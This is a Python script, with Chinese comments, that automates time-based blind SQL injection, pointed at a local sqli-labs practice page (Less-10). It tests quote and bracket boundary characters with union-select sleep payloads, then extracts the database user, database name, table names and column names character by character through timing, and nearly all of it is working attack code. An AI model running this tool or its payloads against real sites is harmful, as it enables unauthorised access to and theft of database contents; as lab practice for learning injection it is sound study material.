# /usr/bin/env python3.6
# coding=utf8

import sys
import time
import math
import logging
import requests


def get(url):
	"""
	发出一个GET请求，返回从发出请求到接到响应消耗的秒数
	"""
	logging.info('[*] GET {}'.format(url))
	start_time = time.time()
	r = requests.get(url=url, timeout=TIME_OUT)
	if r.status_code != 200:
		logging.warn('The url {} returns {}'.format(url, r.status_code))
	duration = time.time() - start_time
	return duration


def is_right(response_time):
	"""
	根据HTTP请求响应时间判断SQL是否正确执行
	"""
	if (response_time - base_time) > 0.8*DELAY:
		return True
	else:
		return False


def is_vulnerability(target):
	"""
	确定目标是否存在注入漏洞
	"""
	global base_time
	base_time = get(target.format(VALUE))
	crosses = ['"', '")' '"))', '\'', '\')', '\'))']
	payload = ' union select 1,2,sleep({}) '.format(DELAY)
	for cross in crosses:
		if is_right(get(target.format(VALUE + cross + payload + COMMENT))):
			logging.info('[+] SQL injection vulnerability exists, cross boundary symbol is `{}`.'.format(cross))
			break
	else:
		cross = None
		logging.fatal('[-] No SQL injection vulnerability exists.')
	return cross


def get_data_by_time(target, cross, select):
	"""
	通过查询数据
	"""
	real_values = str()
	union_select = ' union select 1,2, if(ascii(substr(({}), {{}}, 1)) <= {{}}, sleep({}), 1)'.format(select, DELAY)

	n = 1
	while True:
		max_value = 127
		min_value = 0

		if is_right(get(target.format(cross + union_select.format(n, min_value) + COMMENT))):
			break
		if not is_right(get(target.format(cross + union_select.format(n, max_value) + COMMENT))):	
			break

		while min_value < max_value-1:
			middle_value = math.ceil((max_value+min_value)/2)

			if is_right(get(target.format(cross + union_select.format(n, middle_value) + COMMENT))):
				max_value = middle_value
			else:
				min_value = middle_value

		if is_right(get(target.format(cross + union_select.format(n, max_value) + COMMENT))):
			real_value = max_value
		else:
			real_value = min_value

		real_values += chr(real_value)
		n += 1

	return real_values


def main(target):
	"""
	对目标进行基于时间的SQL盲注
	"""
	# 检查是否有注入漏洞
	cross = is_vulnerability(target)
	if cross is None:
		exit(-1)


	# 返回用户名
	select = 'select user()'
	user = get_data_by_time(target, cross, select)
	print('{}: {}'.format(select, user))

	# 返回数据库名
	select = 'select database()'
	database = get_data_by_time(target, cross, select)
	print('{}: {}'.format(select, database))

	# 返回表名
	tables = list()
	n = 0
	while True:
		select = 'select table_name from information_schema.tables where table_schema = "{}" limit {}, 1'.format(database, n)
		data = get_data_by_time(target, cross, select)
		if data != '':
			tables.append(data)
			n += 1
		else:
			break
	print('There are tables {} in database {}'.format(', '.join(tables), database))

	# 返回列名
	for table in tables:
		columns = list()
		n = 0
		while True:
			select = 'select column_name from information_schema.columns where table_schema = "{}" and table_name = "{}" limit {}, 1'.format(database, table, n)
			data = get_data_by_time(target, cross, select)
			if data != '':
				columns.append(data)
				n += 1
			else:
				break
		print('There are columns {} in table {}'.format(', '.join(columns), table))	


if __name__ == '__main__':

	TARGET = 'http://127.0.0.1/sqlilabs/Less-10/?id={}'    # 存在注入点的URL，参数值用{}替代
	VALUE = '1'    # 注入参数的原值
	COMMENT = '+--+'    # SQL注释格式
	DELAY = 0.1    # 测试存在漏洞时的睡眠时间，如果网速特别好这个值可以小一些
	TIME_OUT = 60    # 请求超时时间，单位为秒
	LOGGING_LEVEL = logging.WARN    # 日志级别

	logging.basicConfig(level=LOGGING_LEVEL)
	logging.debug('[*] The target is {}'.format(TARGET.format(VALUE)))
	main(TARGET)
